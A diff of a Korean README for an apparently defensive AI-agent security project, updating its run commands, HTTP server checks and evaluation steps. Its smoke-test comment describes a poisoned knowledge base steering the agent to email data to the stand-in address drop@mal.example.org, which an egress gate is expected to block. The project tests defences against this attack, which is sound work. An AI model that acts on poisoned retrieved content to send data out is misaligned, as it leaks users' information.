@@ -81,17 +81,27 @@ cp .env.example .env    # GOOGLE_API_KEY
 python -m scripts.check_env        # 키·모델ID·RPM 실측
 python -m eval.data_spike          # 6개 로더 관통 → data/manifest.json
 
-# ★ money smoke — 프로젝트의 핵심 증명
-python -m src.agent.loop --scenario poisoned_kb --defenses tier_a
+# ★ money smoke — 프로젝트의 핵심 증명 (CLI)
+python -m src.agent.cli --scenario poisoned_kb --defenses tier_a
 #   기대: 분류기 전부 OFF, 오염 KB → send_email(drop@mal.example.org) 시도 →
 #         gate_decision=BLOCK, gate_rule=egress.email_domains, executed=false
 
+# ★ 실제 구동 서비스 (HTTP 런타임) — 서버 고정 방어(tier_a+dlp_vault+strict)
+uvicorn src.agent.server:app --port 8000
+curl -s localhost:8000/healthz                         # {"status":"ok"}
+curl -s localhost:8000/readyz                          # provider 준비 여부
+curl -s -XPOST localhost:8000/v1/agent/run \
+     -H 'content-type: application/json' \
+     -d '{"input":"고객 010-1234-5678 환불 상태를 조회해 주세요"}'
+
 # 평가
-pytest
+pytest                             # 50 통과 (.venv, pytest-asyncio+presidio)
 python eval/ablation.py            # → results/ablation.csv (McNemar p, Wilson CI)
 python eval/kanana_compare.py      # 채널 조건부 2×2
-streamlit run app/ui.py            # 데모
+open report/trace_view.html        # 정적 트레이스 데모 뷰어
 ```
+
+> 프로덕션 전환 로드맵(레퍼런스 아키텍처·설정·단계별)은 [docs/PRODUCTION.md](docs/PRODUCTION.md) 참조.
 
 ---
 
